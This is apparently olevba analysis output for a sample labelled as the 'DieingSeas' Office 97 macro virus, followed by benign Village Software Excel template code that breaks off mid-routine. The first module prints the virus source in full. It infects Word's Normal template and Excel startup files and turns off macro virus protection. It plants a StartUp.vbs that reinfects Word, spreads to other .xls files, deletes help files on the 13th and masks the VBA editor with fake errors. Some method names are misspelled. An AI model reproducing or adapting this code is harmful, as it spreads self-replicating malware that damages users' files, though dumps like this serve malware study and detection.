olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub DieLikeEvery1()
On Error Resume Next
Dim an As Boolean, ar As Boolean
VBA.SetAttr NormalTemplate.FullName, vbNormal
Options.SaveNormalPrompt = 1 - 1
VBE.ActiveVBproject.VBComponents("DieingSeas").Export "c:\ra"
Set nonono = NormalTemplate.VBProject.VBComponents
Set acacac = ActiveDocument.VBProject.VBComponents
For x = 1 To nonono.Count
If nonono(x).Name = "DieingSeas" Then an = True
Next x
For f = 1 To acacac.Count
If acacac(f).Name = "DieingSeas" Then ar = True
Next f
If an = True And ar = False Then acacac.Import "c:\ra"
If an = False And ar = True Then nonono.impory "c:\ra"
Kill "c:\ra"
End Sub
Sub AutoOpen()
On Error Resume Next
DieLikeEvery1
JumpToExcell
SickBomb
RunAtStartUp
End Sub
Sub SickBomb()
On Error Resume Next
If Day(Now) = 13 Then
MsgBox "We are Just A Drop In The Ocean!", vbApplicationModal, "Dieing Seas"
Do
Ram = InputBox("Give me a word!", "Now")
Loop Until Ram = "Die"
MsgBox "Die"
Kill "c:\windows\help\*.cnt"
End If
End Sub
Sub RunAtStartUp()
On Error Resume Next
VBE.ActiveVBproject.VBComponents("DieingSeas").Export "c:\windows\system\code.infected"
Kill "c:\windows\Start Menu\Programs\StartUp\StartUp.vbs"
Open "c:\windows\Start Menu\Programs\StartUp\StartUp.vbs" For Random As vbs
Print vbs; "On Error Resume Next"
Print vbs; "Set WordObj=CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print vbs; "Set NT=WordObj.NormalTemplate"
Print vbs; "NT.VBproject.Vbcomponents.import " & Chr(34) & "C:\windows\system\code.infected" & Chr(34)
Print vbs; "nt.save"
Print vbs; "WordObj.Close"
Close vbs
End Sub
Sub JumpToExcell()
On Error Resume Next
Set Exc = CreateObject("Excel.Application")
SetAttr Exc.StartupPath & "\book1.", vbNormal
Set nr = Exc.Workbooks.Add
Set rt = nr.Vbprojects.VBComponents("ThisWorkBook").CodeModule
rt.InserLines 1, VBE.ActiveVBproject.VBComponents("DieingSeas").CodeModule.Lines(1, 123)
nr.SaveAs Exc.StatUpPath & "\book1."
nr.Close
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.ScreenUpdating = (4 - 4)
Application.EnableCancelKey = xlDisabled
Options.VirusProtection = (0 - 0)
If (Dir(Application.StartupPath & "\Book1.")) <> "" Then
SetAttr Application.StartupPath * "\Book1.", vbNormal
End If
Set Grand = Workbooks.Add
Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.countoflines
f = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 123)
Grand.VBProject.VBComponents("ThisWotkbook").CodeModule.AddfromString
Grand.SaveAs Application.StartupPath & "\Book1.", xlNormal, , , , , , , False
Grand.Close
Set fs = Application.FileSearch
fs.NewSearch
fs.LookIn = ActiveWorkbook.Path
fs.FileName = "*.xls"
fs.SearchSubFolders = True
fs.Execute msoSortByFileName
For x = 1 To fs.FoundFiles.Count
Set tEmp = Workbooks.Open(fs.FoundFiles(x))
If tEmp.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 1) <> "Sub DieLikeEvery1()" Then
tEmp.VBProject.VBComponents("ThisWorkbook").CodeModule.DeleteLines Grand.VBProject.VBComponents("ThisWorkbook").CodeModule.countoflines
Source = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(1, 123)
tEmp.VBProject.VBComponents("ThisWotkbook").CodeModule.AddfromString
tEmp.Save
End If
tEmp.Close
Next x
Application.ScreenUpdating = True
SickBomb
JmpWord
End Sub
Sub JmpWord()
On Error Resume Next
conte = VBE.ActiveVBproject.VBComponents("DieingSeas").CodeModule.Lines(1, 123)
Set wordobj = CreateObject("Word.Application")
Set nt = wordobj.NormalTemplate.VBProject.VBComponents
Set fso = CreateObject("Scripting.FileSystemObject")
Kill "c:\ra"
Set r = fso.opentextfile("C:\ra", 2, True)
r.writeline "Attribute VB_Name = " & Chr(34) & "DieingSeas" & Chr(34)
r.writeline conte
r.Close
nt.Import "c:\ra"
wordobj.NormalTemplate.Save
Kill "c:\ra"
wordobj.Quit
End Sub
Sub ViewVbCode()
MsgBox "Dll viewcode.dll Required!", vbCritical, "External Error"
End Sub
Sub ToolsMacro()
MsgBox "Dll viewcode.dll Required!", vbCritical, "External Error"
End Sub
Rem +++++++++Dieing Seas Office 97 Virus+++++++++
Rem This is a little bug that infects excel and
Rem Word at the same time :-)
Rem It isn't very good bcoz too much work lately
Rem Also it's stealth Sux
Rem In a newer Version Everything will be differnt
Rem ++++++++++++++++++++++++++++++++++++++++++++++
Rem Created By Yozak=00= for MetaPhase :-) greetz to Knowdeth & bsl4


-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm01.frm 
in file: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962 - OLE stream: '_VBA_PROJECT_CUR/VBA/UserForm01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Label3_Click()

End Sub
-------------------------------------------------------------------------------
VBA MACRO UserClass_Module01.cls 
in file: Virus.MSWord.Intended.DieingSeas-0dc9df583bea0fd779b2c41a1c3d78fd671ea24320d589874b52cd2b3183a962 - OLE stream: '_VBA_PROJECT_CUR/VBA/UserClass_Module01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


' ********************************************
' *     MS-Excel Template Control Code       *
' * Copyright(c)1994-6 Village Software, Inc.*
' *           All Rights Reserved            *
' *      LICENSED FOR END-USER USE ONLY.     *
' *  CODE MAY NOT BE INCLUDED IN COMMERCIAL  *
' *   THIRD PARTY APPLICATIONS WITHOUT THE   *
' *     EXPRESSED WRITTEN CONSENT OF         *
' *        VILLAGE SOFTWARE, INC.            *
' *                                          *
' *               Version 7.5                *
' ********************************************

' These routines control the behavior of the toolbars,
' buttons, and other user-interface elements of the
' MS-Excel 95 templates


' ****************************************************
' * Global options, types, declarations, & constants *
' ****************************************************

    Option Base 1
    
    Public LetterFont As String
    Public LetterStyle As String
    Public LetterColor As Integer
    Public LetterSize As Integer

    Public UnqNumber As Variant
    Public Cloak_Next As Boolean
    Global BookName As String
    Global FullBookName As String
    Global Sep As String 'Sep Change MAC
    Global CRet As String 'LT Change MAC
    
    Const SheetBar = "Budgeter"
    Const Vital = "Customize Your Budgeter"
    Const Content1 = "Budget Summary"
    
    Const Lock_String = "Lock/Save Sheet"
    Const Lock_Text = "You can lock the information on the Customize page and save your customized version of the template."
    Const Unlock_String = "Unlock This Sheet"
    Const Unlock_Text = "By unlocking this sheet, you enable changes to be made to the information on the Customize sheet. Select ""Lock This Sheet"" after you make your changes to protect the sheet from accidental changes."
    Const Save_Alrt = "Your new customized template has been saved to the directory "
    Const Save_Alrt2 = ".  To begin use, click Close from the File menu and then click New to open your template."
    Const Save_Filter = "Templates,*.xlt"
    Const Save_Title = "Save Template"
    
    Const FinePrint_String = "Enter the text to appear in the Fine Print box:"
    Const FareWellStmnt_String = "Enter the text to appear in the Farewell Statement box:"
    Const NotAvail_String = "This feature is not available in this version of Excel."
    Const Erase_String = "Your current data will be overwritten.  Do you want to continue?"

    Const FinePrint_BoxName = "Fine Print"
    Const FareWellStmnt_BoxName = "Farewell Statement"

    Const Logo_Error = "You must unlock the Customize sheet to change the logo for this template."
    Const LetterFont_Error = "You must unlock the Customize sheet to change the lettertype for this template."
    Const Univ_Error = "Unexpected Error #"

    Const Graph_Error = "Sorry.  You cannot make that chart selection.  Please try a different chart type."
        
    Const GoalSk_Bar = "Change the size of this bar or another bar..."
    Const GoalSk_Pie = "Change the size of this slice or another slice..."
    
    Const SQ_DB_Loc = "There is no Common database in the specified directory.  Please reset the database location in the Customize page."
    Const SQ_DB_Struc = "This database structure is not compatible with the template.  Please restore original structure."
    Const SQ_DB_CatTitle = "Product and Service Catalog"
    Const SQ_DB_CatItem = "Product/Service Name"
    Const SQ_DB_EmpTitle = "Employee Info"
    Const SQ_DB_EmpItem = "Employee Name"
 
    Const VIL_Ttl = "Village Software"

    Const VIL_Dlg = "Village Software provides a variety of business and financial desktop solutions for Excel and Office.  For a free catalog, call 800-724-9332 or come to our Web site. (http://www.villagesoft.com)"
    Const VIL_Dlg2 = "No free telephone support is offered for these online templates.  A support package is available at a nominal charge from Village Software.  Call 800-724-9332 to purchase this plan and/or template upgrades."
    Const VIL_Dlg3 = "These online templates are copyrighted, licensed software, intended to be used as-is.  They may NOT be placed in shareware libraries or embedded in commercial applications without the written consent of Village Software, Inc."
    
    Const EmpDlg = "Select Employee"
    Const LockDlg = "Lock"
    Const CredDlg = "Credits"
    
    Const ZoomButton = 1
    Const TipButton = 2
    Const DocButton = 3
    Const HelpButton = 4
    Const SampleButton = 5
    Const SplitButton = 6
    Const CalcButton = 7
    Const CredButton = 8
 
    Const Zoom1 = 80
    Const Zoom2 = 95
    Const Zoom3 = 105
    
    Const DatabasePathCell = "B3"
    Const LocalizationCell = "LOC"
    Const SampleStateCell = "SS"
    Const ToolbarStateCell = "NS"
    Const CommonDBPathCell = "CDB"
    Const ContentSheetCell = "CS"
    
    Const File_Help = "VSTMPLT"
    Const File_DB = "COMMON"

    Const Cloak = True
    Const Default_Font = "Arial"

    Const cRange = "Range"
    Const cWorksheet = "Worksheet"
    Const cDialogsheet = "DialogSheet"
    Const cNothing = "Nothing"
    Const cEmpty = "Empty"



' ***********************************
' * Automatic execution procedures  *
' ***********************************


Sub Auto_Open()
'Initializes the worksheet properties

    Application.ScreenUpdating = False
    ThisWorkbook.Activate
    PostXL5 = (Int(Left(Application.Version, 1)) > 5)
    MacXL = (UCase(Left(Application.OperatingSystem, 3)) = "MAC")
    
    If MacXL Then Sheets(Vital).DrawingObjects("LGBUT").OnAction = "NotAvail"
    
    If CheckBars(SheetBar) Then
      If Not PostXL5 Then 'Sep Change XL5
        Sep = "" 'Sep Change MAC
      Else  'Sep Change MAC
        Sep = Application.PathSeparator 'Sep Change MAC
      End If
      
      If MacXL Then Toolbars(SheetBar).ToolbarButtons(CalcButton).OnAction = "NotAvail" 'Toolbar Change MAC
        Toolbars(SheetBar).ToolbarButtons(ZoomButton).OnAction = "PageZoom"
        Toolbars(SheetBar).ToolbarButtons(TipButton).OnAction = "CellTipDisplay"
        Toolbars(SheetBar).ToolbarButtons(DocButton).OnAction = "DocumentCell"
        Toolbars(SheetBar).ToolbarButtons(HelpButton).OnAction = "Help"
        Toolbars(SheetBar).ToolbarButtons(SampleButton).OnAction = "ToggleSample"
        Toolbars(SheetBar).ToolbarButtons(SplitButton).OnAction = "SplitWindow"
        Toolbars(SheetBar).ToolbarButtons(CredButton).OnAction = "VillageCredit"
    End If


    With ActiveWorkbook
      .OnSheetActivate = "CheckSheet"
      .OnSheetDeactivate = "CloakSheet"
    End With
    ActiveWindow.OnWindow = "CheckWindow"
    
    For Each ThisSheet In Sheets
      If TypeName(ThisSheet) = cWorksheet Then ThisSheet.OnEntry = "CheckEntry"
      If TypeName(ThisSheet) = cDialogsheet Then
        For Each dTextbox In ThisSheet.TextBoxes
          If dTextbox.Font.Size = 8 And MacXL Then dTextbox.Font.Size = 9
        Next
      End If
    Next
   
    LetterFont = Default_Font
    Application.DisplayNoteIndicator = True
    
    FullBookName = ActiveWorkbook.Name
    BookName = ParentWorkbook(FullBookName)
    
    AutoScale
    
    Range(LocalizationCell) = Application.International(1)
    Range(ContentSheetCell) = Sheets(Content1).Name
    
    Specific_AutoStart
    
    'Application.ScreenUpdating = True
    
End Sub

       


Sub Auto_Close()
'Orderly closedown/pass-off of toolbars, etc.

    Unhide_Workbook ThisWorkbook.Name

    If CheckBars(SheetBar) Then
        
        If BookName = "" Then
            BookName = ParentWorkbook(ActiveWorkbook.Name)
        End If
        
        If IsNull(SiblingWorkbooks(BookName, 1)) Then
            Toolbars(SheetBar).Delete
            Application.OnWindow = ""
        Else
            TransName = SiblingWorkbooks(BookName, 1)
            Toolbars(SheetBar).ToolbarButtons(ZoomButton).OnAction = _
              TransName & "!PageZoom"
            Toolbars(SheetBar).ToolbarButtons(TipButton).OnAction = _
              TransName & "!CellTipDisplay"
            Toolbars(SheetBar).ToolbarButtons(DocButton).OnAction = _
              TransName & "!DocumentCell"
            Toolbars(SheetBar).ToolbarButtons(HelpButton).OnAction = _
              TransName & "!Help"
            Toolbars(SheetBar).ToolbarButtons(SampleButton).OnAction = _
              TransName & "!ToggleSample"
            Toolbars(SheetBar).ToolbarButtons(SplitButton).OnAction = _
              TransName & "!SplitWindow"
            Toolbars(SheetBar).ToolbarButtons(SplitButton).OnAction = _
              TransName & "!VillageCredit"
            If MacXL Then Toolbars(SheetBar).ToolbarButtons(CalcButton).OnAction = _
              TansName & "!NotAvail" 'Toolbar Change MAC
            
            If Windows(TransName).Visible = False Then
                Toolbars(SheetBar).Visible = False
            End If


        End If
    End If
    
    Specific_AutoStop
       
End Sub


Sub CheckSheet()
'Executed on worksheet changes

    If BookName = "" Then
        FullBookName = ActiveWorkbook.Name
        BookName = ParentWorkbook(ActiveWorkbook.Name)
    End If
    
    Specific_CheckSheet
  
    'update status bars
    If CheckBars(SheetBar) Then
    
      Range(ToolbarStateCell) = Toolbars(SheetBar).Visible
      
      If TypeName(ActiveSheet) = cWorksheet And ActiveWindow.Type = xlWorkbook Then
        
        'update zoom status
        Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed = (ActiveWindow.Zoom < ZoomFactor)

        'update split/freeze status
        If SplitButton > 0 Then
            Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed = ActiveWindow.FreezePanes
        End If

        'update sample status
        Toolbars(SheetBar).ToolbarButtons(SampleButton).Pushed = Range(SampleStateCell)
       
        'update celltip display status
        Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed = Not Application.DisplayNoteIndicator
    
      Else
        For i = 1 To 6
            With Toolbars(SheetBar).ToolbarButtons(i)
                If .Enabled Then .Pushed = False
            End With
        Next
      End If
    End If
   
End Sub


Sub CloakSheet()
'manages hiding of vital sheet and closing of toolbars


    If CheckBars(SheetBar) Then
        On Error Resume Next
        Workbooks(FullBookName).Sheets(Vital).Range(ToolbarStateCell) = Toolbars(SheetBar).Visible
        On Error GoTo 0
    End If
    
    'hides vital sheet
    On Error Resume Next
    If ActiveWindow.Type <> xlInfo Then
      On Error GoTo 0
      If TypeName(ActiveSheet) <> cNothing Then
        WorkbookName = ActiveWorkbook.Name
        If UCase(Right(WorkbookName, 4)) = ".XLS" _
         Or UCase(Right(WorkbookName, 4)) = ".XLT" Then _
         WorkbookName = Left(WorkbookName, Len(WorkbookName) - 4)
        If WorkbookName = FullBookName Then
            If ActiveSheet.Name <> Vital Then
                If Cloak_Next = True And Cloak = True Then
                    Sheets(Vital).Visible = False
                    Cloak_Next = False
                    Specific_AutoStart
                End If
            Else
                Cloak_Next = True
            End If
        End If
      End If
    End If
    On Error GoTo 0
    
    'closes old bar down
    If TypeName(ActiveWorkbook) = cNothing Then
        If CheckBars(SheetBar) Then
            Toolbars(SheetBar).Visible = False
        End If
    Else
        If BookName <> Left(ActiveWorkbook.Name, Len(BookName)) Then
            If CheckBars(SheetBar) Then
                Toolbars(SheetBar).Visible = False
            End If
        Else
            If LCase(Left(Right(ActiveWorkbook.Name, 12), 8)) = "database" Then
                If CheckBars(SheetBar) Then
                    Toolbars(SheetBar).Visible = False
                End If
            End If
        End If
    End If
        
End Sub


Sub CheckWindow()

    If CheckBars(SheetBar) Then
        If LCase(BookName) = LCase(Left(ActiveWorkbook.Name, Len(BookName))) _
         And LCase(Right(Trim(ActiveWorkbook.Name), 8)) <> "database" _
         And ActiveWindow.Type <> xlChartInPlace Then
            Toolbars(SheetBar).Visible = Range(ToolbarStateCell)
            CheckSheet
        Else
            Toolbars(SheetBar).Visible = False
        End If
    End If
    Application.StatusBar = False
    
End Sub


Sub CheckEntry()
'Executed on any entry in any cell

    If ActiveSheet.Name = Vital Then
        If LetterSize = 0 Then
            LetterSize = 10
        End If
        PreviewPane
    Else
        If TypeName(ActiveSheet) = cWorksheet Then
            ArrangeEntries
        End If
    End If
        
End Sub


Sub AutoScale()
'scales the default zoom factor to the user's monitor size

    For Each ThisSheet In Sheets
      If TypeName(ThisSheet) = cWorksheet Then
        ThisSheet.Activate
        ActiveWindow.Zoom = ZoomFactor
      End If
    Next
    
    ActiveWindow.ScrollWorkbookTabs Position:=xlFirst
    Sheets(Content1).Activate
    
End Sub



' *******************************************
' *  Button and Toggle/States support code  *
' *******************************************


Sub PageZoom()
'Controls Zoom toolbar button

  If TypeName(ActiveSheet) = cWorksheet And TypeName(Selection) = cRange Then

    On Error GoTo Err_1
    
    Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed = _
     Not Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed

    If Not Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed Then
        ActiveWindow.Zoom = ZoomFactor
    Else
        Application.ScreenUpdating = False
        Set ThisCell = ActiveCell
        Range("Print_Area").Select
        ActiveWindow.Zoom = True
        ThisCell.Select
        'Application.ScreenUpdating = True
    End If
  
  End If
  On Error GoTo 0
  Exit Sub

Err_1:

  Toolbars(SheetBar).ToolbarButtons(ZoomButton).Pushed = False
  'Application.ScreenUpdating = True
  Err = 0
  On Error GoTo 0

End Sub



Sub ToggleSample()
'Controls Sample toobar button
      
    On Error GoTo Err_S:
    Selection.DataSeries
      
    Application.ScreenUpdating = False
    Set StartSheet = ActiveSheet
 
    For Each ThisSheet In Sheets
      If TypeName(ThisSheet) = cWorksheet Then
        ThisSheet.Activate
        If TypeName(Selection) <> cRange Then ThisSheet.Range("A1").Select
        PIndex = ThisSheet.Index
        For Each ThisScen In ThisSheet.Scenarios
            TName = ThisScen.Name
            TIndex = ThisScen.Index
            If Left(TName, 6) = "sample" Then
              If Int(Left(Application.Version, 1)) > 5 Then
                Set SelCells = Sheets(PIndex).Scenarios(TName).ChangingCells
              Else
                tEmp = ExecuteExcel4Macro("SCENARIO.GET(2," & Chr(34) & ThisScen.Name & Chr(34) & ")")
                Set SelCells = Range(tEmp)
              End If
              ScenNo = Right(TName, Len(TName) - 6)
              ScenName = "current" & Trim(ScenNo)
              If Range(SampleStateCell).Value = False Then

                  If CheckScenarios(ScenName, PIndex) Then
                      ThisSheet.Scenarios(ScenName).Delete
                  End If
    
                  Sheets(PIndex).Scenarios.Add ScenName, SelCells
                  ThisScen.Show
              Else
                  ThisSheet.Scenarios(ScenName).Show
              End If

            End If
        Next
      End If
    Next

    Toolbars(SheetBar).ToolbarButtons(SampleButton).Pushed = _
    Not Toolbars(SheetBar).ToolbarButtons(SampleButton).Pushed
      
    Range(SampleStateCell).Value = _
    Not Range(SampleStateCell).Value
    
    StartSheet.Activate
    'Application.ScreenUpdating = True

Err_S:
End Sub



Sub CellTipDisplay()
'Controls the CellTip Display button on the toolbar
    
  If TypeName(ActiveSheet) = cWorksheet And ActiveWindow.Type = xlWorkbook Then
    
    Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed = _
    Not Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed

    If Not Toolbars(SheetBar).ToolbarButtons(TipButton).Pushed Then
        Application.DisplayNoteIndicator = True
    Else
        Application.DisplayNoteIndicator = False
    End If
    
  End If
    
End Sub



Sub SplitWindow()
'Controls the Split button on the toolbar, toggles split on active cell
        
  If TypeName(ActiveSheet) = cWorksheet And TypeName(Selection) = cRange _
   And ActiveWindow.WindowState <> xlMinimized Then
            
    Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed = _
    Not Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed

    Application.ScreenUpdating = False
    
    If Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed Then
        If ActiveCell.Row > ActiveWindow.ScrollRow Then
            With ActiveWindow
                .SplitColumn = 0
                .SplitRow = ActiveCell.Row - ActiveWindow.ScrollRow
            End With
            ActiveWindow.FreezePanes = True
        Else
            Toolbars(SheetBar).ToolbarButtons(SplitButton).Pushed = False
        End If
    
    Else
        
        With ActiveWindow
            .SplitColumn = 0
            .SplitRow = 0
        End With

    End If
    'Application.ScreenUpdating = True
  
  End If

End Sub



Sub LockSheet()
'Controls the Lock Sheet button on the Vitals page
 
    If Int(Left(Application.Version, 1)) < 7 Then  'XL5 change!
        Sheets(LockDlg).OptionButtons("LCK_2").Enabled = False
        Sheets(LockDlg).OptionButtons("LCK_1").Value = xlOn
    End If
    

    If Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String Then
      
      If DialogSheets(LockDlg).Show Then
        Sheets(Vital).Protect DrawingObjects:=True, Contents:=True
        Sheets(Vital).DrawingObjects("Lock").Caption = Unlock_String
        Sheets(LockDlg).DialogFrame.Caption = Unlock_String
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Text = Unlock_Text
        Sheets(LockDlg).GroupBoxes("PNL2").Visible = False
        Sheets(LockDlg).OptionButtons("LCK_1").Visible = False
        Sheets(LockDlg).OptionButtons("LCK_2").Visible = False
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Height = 80
        If Sheets(LockDlg).OptionButtons("LCK_2").Value = xlOn Then
          ThisDir = CurDir()
          TempDir = Application.TemplatesPath
          ChDrive Mid(TempDir, 1, 1)
          ChDir TempDir
          FileNm = Application.GetSaveAsFilename(FileFilter:=Save_Filter, Title:=Save_Title)
          If FileNm <> False Then
            OWFlg = Application.DisplayAlerts
            Application.DisplayAlerts = False
            ActiveWindow.ScrollWorkbookTabs Position:=xlFirst
            Sheets(Content1).Activate
            Sheets(Vital).Visible = False
            With ActiveWorkbook
                .SaveAs FileName:=FileNm, FileFormat:=xlTemplate
                FName = .FullName
                PName = .Path
            End With
            Application.DisplayAlerts = OWFlg
            MsgBox Save_Alrt & PName & Save_Alrt2, vbOKOnly + vbInformation, SheetBar
          End If
          ChDrive Mid(ThisDir, 1, 1)
          ChDir ThisDir
        End If
      End If
                        
    Else
        
      If DialogSheets(LockDlg).Show Then
        Sheets(Vital).Unprotect
        Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String
        Sheets(LockDlg).DialogFrame.Caption = Lock_String
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Text = Lock_Text
        Sheets(LockDlg).GroupBoxes("PNL2").Visible = True
        Sheets(LockDlg).OptionButtons("LCK_1").Visible = True
        Sheets(LockDlg).OptionButtons("LCK_2").Visible = True
        Sheets(LockDlg).TextBoxes("PNL1_TXT1").Height = 40
      End If
    
    End If

End Sub



Sub Customize()
'Controls Customize button on any Content Page

    Cloak_Next = True
    Sheets(Vital).Visible = True
    Sheets(Vital).Select
    CheckSheet

End Sub



Sub FinePrint()
'Controls the Fine Print area on the any Content page

    FineText = InputBox(FinePrint_String, _
        FinePrint_BoxName, ActiveSheet.DrawingObjects("FP").Characters.Text)
    ActiveSheet.DrawingObjects("FP").Characters.Text = FineText
    
End Sub



Sub FareWellStmnt()
'Controls the Farewell Statement area on any Content page

    FWSText = InputBox(FareWellStmnt_String, _
        FareWellStmnt_BoxName, ActiveSheet.DrawingObjects("FS").Characters.Text)
    ActiveSheet.DrawingObjects("FS").Characters.Text = FWSText
    
End Sub




' *********************************************************
' * Procedures which manage the logo and lettertype boxes *
' *********************************************************


Sub InsertLogo()
'Lets the user insert a custom logo

  Dim LoopL As Integer
  Dim LogpPic As Variant
  Dim Err_Flg As Boolean

  If Sheets(Vital).DrawingObjects("Lock").Caption = Lock_String Then

    ShtMem = ActiveSheet.Index

    Sheets(Vital).Activate
    Set Mem = ActiveCell

    With ActiveSheet.DrawingObjects("LG")
        lgl = .Left
        lgt = .Top
        lgw = .Width
        lgh = .Height
    End With

    On Error GoTo Err_1B
    
    If Application.Dialogs(xlDialogInsertPicture).Show Then

      Application.ScreenUpdating = False

      ActiveSheet.DrawingObjects("LG").Delete

      On Error GoTo Err_2

      With Selection
        .Left = lgl
        .Top = lgt
        .Width = lgw
        .Height = lgh
        .Width = lgw
        .Name = "LG"
        .OnAction = "Nada"
        .Copy
      End With

      Mem.Select

      For Each ThisSheet In Sheets
        If TypeName(ThisSheet) = cWorksheet Then

          ThisSheet.Activate
          Set Mem = ActiveCell
          ActiveSheet.DrawingObjects("LG").Select

          If Not Err_Flg Then

            With ActiveSheet.DrawingObjects("LG")
                lgl = .Left
                lgt = .Top
                lgw = .Width
                lgh = .Height
                .Delete
            End With

            ActiveSheet.Paste

            With Selection
                .Left = lgl
                .Top = lgt
                .Width = lgw
                .Height = lgh
                .Name = "LG"
                .OnAction = "Nada"
            End With

          Else
            Err_Flg = False
          End If

          Mem.Select
        End If
      Next

      Sheets(ShtMem).Activate
    End If

  Else

    MsgBox Logo_Error, vbCritical, SheetBar
  
  End If
      
  On Error GoTo 0
  'Application.ScreenUpdating = True
  Exit Sub
    
Err_1B:

  MsgBox Error(Err), vbCritical + vbOKOnly, SheetBar
  Err = 0
  'Application.ScreenUpdating = True
  On Error GoTo 0
  Exit Sub

Err_2:
    
  If Err <> 1004 And Err <> 1006 Then

    Msg = Univ_Error & Str(Err) & ": " & Error(Err)
    MsgBox Msg, vbCritical, SheetBar
    Err = 0
  Else
    Err_Flg = True
    Err = 0
    Resume Next
  End If

  Sheets(ShtMem).Activate
  On Error GoTo 0
  'Application.ScreenUpdating = True

End Sub


Sub PreviewPane()
'Adds text into the preview panels dynamically

  Dim Len1 As Integer
  Dim String1 As String
  Dim Thisbox As Variant
  Dim LoopA As Integer

  'Application.ScreenUpdating = False
  
  If UCase(Left(Application.OperatingSystem, 3)) = "MAC" Then 'LT change MAC
    CRet = Chr(13)
  Else
    CRet = Chr(10)
  End If
  

  Len1 = Sheets(Vital).Range("vital1").Characters.Count

  If Not IsEmpty(Range("vital4")) And Not IsEmpty(Range("vital5")) Then
    Comma = ", "
  Else
    Comma = ""
  End If

  If Not IsEmpty(Range("vital9")) Then
    Fax = " fax "
  Else
    Fax = ""
  End If
    
  String1 = Sheets(Vital).Range("vital1").Value & CRet _
    & Sheets(Vital).Range("vital2").Value & CRet _
    & Sheets(Vital).Range("vital4").Value & Comma & Sheets(Vital).Range("vital5").Value & "  " & Sheets(Vital).Range("vital6").Value _
    & CRet & Sheets(Vital).Range("vital8").Value & Fax & Sheets(Vital).Range("vital9") 'LT Change MAC

  On Error GoTo Err_2B

  For Each ThisSheet In Sheets
    If TypeName(ThisSheet) = cWorksheet Then

      ThisSheet.DrawingObjects("LT").Characters.Text = String1

      If Err_Flg = False Then
        With ThisSheet.DrawingObjects("LT").Characters.Font
          .Name = LetterFont
          .ColorIndex = LetterColor
          .Size = LetterSize
          .Strikethrough = False
          .Superscript = False
          .Subscript = False
          .OutlineFont = False
          .Shadow = False
          .Underline = xlNone
          .FontStyle = LetterStyle
        End With

        With ThisSheet.DrawingObjects("LT").Characters(Start:=1, Length:=Len1).Font
          .Size = LetterSize + 10
          .FontStyle = LetterStyle
        End With

      Else
        Err_Flg = False
      End If
    End If
  Next

  On Error GoTo 0
  'Application.ScreenUpdating = True
  Exit Sub

Err_2B:

  If Err <> 1004 And Err <> 1006 Then

    Msg = Univ_Error & Str(Err) & ": " & Error(Err)
    MsgBox Msg, vbCritical, SheetBar
    Err = 0
  Else
    Err_Flg = True
    Err = 0
    Resume Next
  End If

  On Error GoTo 0
  'Application.ScreenUpdating = True

End Sub



' **********************************************
' * Procedures which manage content data entry *
' **********************************************


Sub ArrangeEntries()
'Makes sure entered data lines up in correct positions

    If Not ActiveCell.HasFormula Then
        
        On Error GoTo Err_3
            
        Set MarkCell_1 = ActiveCell
        Set MarkCell_2 = ActiveCell
    
        Do Until LCase(Left(MarkCell_2.Name.Name, 4)) = "data"
            Set MarkCell_2 = MarkCell_2.Offset(0, -1)
        Loop
                
        If MarkCell_1 <> MarkCell_2 Then
            MarkCell_2.Value = MarkCell_1.Value
            MarkCell_1.ClearContents
            MarkCell_2.Select
        End If
    End If
    On Error GoTo 0
    Exit Sub

Err_3:
    
    Select Case Err
    
    Case 1006
        Err = 0
        Resume Next
        
    Case 1004
